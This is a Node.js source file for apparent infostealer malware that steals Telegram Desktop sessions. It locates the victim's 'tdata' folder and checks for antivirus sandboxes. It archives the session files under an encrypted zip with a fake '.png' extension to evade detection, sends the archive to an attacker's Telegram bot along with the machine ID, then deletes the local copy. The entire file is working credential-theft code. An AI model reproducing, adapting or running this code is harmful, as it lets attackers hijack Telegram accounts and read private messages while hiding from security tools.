const fs = require('fs')
const path = require('path')
const { exec } = require('child_process')

const isWsl = require('is-wsl')
const tempDirectory = require('temp-dir')
const archiver = require('archiver')
const archiverEncrypted = require('archiver-zip-encrypted')
const FormData = require('form-data')
const fetch = require('node-fetch')
const { machineId } = require('node-machine-id')

function getAppDataPath() {
  if (isWsl) {
    return new Promise((resolve, reject) => {
      // Get Windows host username
      exec("powershell.exe '$env:UserName'", (error, stdout, stderr) => {
        if (error) {
          reject(error)
          return
        }
        const username = stdout.trim()
        resolve(`/mnt/c/Users/${username}/AppData/Roaming`)
      })
    })
  } else {
    return Promise.resolve(
      process.env.APPDATA ||
        (process.platform == 'darwin' ? `${process.env.HOME}/Library/Preferences` : `${process.env.HOME}/.local/share`)
    )
  }
}

async function findTelegramDirectoryPath() {
  const appDataPath = await getAppDataPath()
  const telegramDirectory = path.join(appDataPath, 'Telegram Desktop')
  if (fs.existsSync(telegramDirectory)) return telegramDirectory

  // Don't inpesct the process on non-windows platforms
  if (!isWsl && process.platform !== 'win32')
    throw new Error('Could not find the Telegram Desktop directory in appdata!')

  // Telegram is not in appdata, try to find a running portable version by inspecting the telegram process
  return new Promise((resolve, reject) => {
    // Get Telegram process execution path
    exec('powershell.exe "Get-Process telegram | Select-Object Path"', (error, stdout, stderr) => {
      const telegramProcessPath = stdout
        .trim()
        .split('\n')
        .find(x => x.includes('Telegram.exe'))
      if (error || !telegramProcessPath) {
        reject(
          new Error(
            'Could not find the Telegram Desktop directory in appdata nor by inspecting the Telegram.exe process!'
          )
        )
        return
      }
      if (isWsl) {
        // Get Windows host path of the process
        exec(`wslpath "${path.dirname(telegramProcessPath)}"`, (error, stdout, stderr) => {
          if (error) {
            reject(error)
            return
          }
          resolve(stdout.trim())
        })
      } else resolve(path.dirname(telegramProcessPath))
    })
  })
}

/** Check the files before creating the archive (try to detect AV virtual machines!) */
function checkTdataFiles(tdataFiles) {
  const neededFiles = ['dumps', 'emoji', 'key_datas', 'usertag', 'shortcuts-default.json']
  const allTdataFiles = new Set(tdataFiles.map(f => f.name))
  if (tdataFiles.length < 5 || ![...neededFiles].every(needed => allTdataFiles.has(needed)))
    throw new Error('Something is wrong with the tdata files!')
}

function archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword) {
  return new Promise(async (resolve, reject) => {
    const tdataPath = path.join(telegramDirectoryPath, 'tdata')
    const tdataFiles = await fs.promises.readdir(tdataPath, { withFileTypes: true })
    checkTdataFiles(tdataFiles)

    const output = fs.createWriteStream(archivePath)

    archiver.registerFormat('zip-encrypted', archiverEncrypted)
    const archive = archiver('zip-encrypted', {
      zlib: { level: 9 },
      encryptionMethod: 'aes256',
      password: archivePassword
    })

    output.on('close', () => {
      // console.log(`Archive size: ${archive.pointer() / 1024 / 1024} MB`)
      resolve()
    })

    archive.on('error', err => reject(err))

    archive.pipe(output)

    const files = tdataFiles.filter(
      file =>
        !file.name.startsWith('user_data') &&
        file.name !== 'temp' &&
        file.name !== 'dumps' &&
        file.name !== 'emoji' &&
        file.name !== 'working' &&
        file.name !== 'tdummy'
    )

    for (const file of files) {
      if (file.isDirectory()) archive.directory(path.join(tdataPath, file.name), file.name)
      else archive.file(path.join(tdataPath, file.name), { name: file.name })
    }

    archive.finalize()
  })
}

function getHwid() {
  return machineId()
}

async function sendArchiveTelegramWebhook(archivePath, caption, telegramChatId, telegramToken, retriesLeft = 5) {
  const hwid = await getHwid()
  const form = new FormData()
  form.append('document', fs.createReadStream(archivePath, {}), { filename: `${hwid}.zip` })
  form.append('caption', caption)
  const res = await fetch(
    `https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
    {
      method: 'POST',
      body: form
    }
  ).then(res => res.json())

  if (!res.ok) {
    console.error(`Error sending archive! Retrying in 30s - Status: ${res.error_code} - ${res.description}`)
    // Failed to send archive, try again in 30s
    await new Promise(resolve => setTimeout(resolve, 30_000))
    return sendArchiveTelegramWebhook(archivePath, telegramChatId, telegramToken, retriesLeft - 1)
  }
}

function deleteArchive(archivePath) {
  return new Promise((resolve, reject) => {
    fs.unlink(archivePath, err => {
      if (err) reject(err)
      else resolve()
    })
  })
}

/**
 * @typedef RunArg
 * @type {object}
 * @property {string?} telegramChatId
 * @property {string?} telegramToken
 * @property {((filePath: string, filename: string, caption: string) => Promise<void>)?} uploadFileFn Waifu Stealer upload file function
 * @property {string?} archivePassword
 */

/** @param {RunArg} arg0 */
async function run({ telegramChatId, telegramToken, uploadFileFn, archivePassword }) {
  if (uploadFileFn && (telegramChatId || telegramToken))
    throw new Error('Do not provide both a custom upload function and Telegram chat ID and Telegram token!')
  if (!uploadFileFn && (!telegramChatId || !telegramToken))
    throw new Error('Telegram chat ID and Telegram token are required if not providing a custom upload function!')

  if (!archivePassword) archivePassword = 'rigwild/telegram-stealer'

  const telegramDirectoryPath = await findTelegramDirectoryPath()
  const hwid = await getHwid()
  const archivePath = path.join(tempDirectory, `${hwid}.png`) // Fake extension to prevent file type detection
  await archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword)

  let caption = `New Telegram Desktop session archive\\!\nArchive Password: \`${archivePassword}\``
  if (uploadFileFn) await uploadFileFn(archivePath, `${hwid}.zip`, caption)
  else await sendArchiveTelegramWebhook(archivePath, caption, telegramChatId, telegramToken)

  await deleteArchive(archivePath)
}

module.exports = { run }
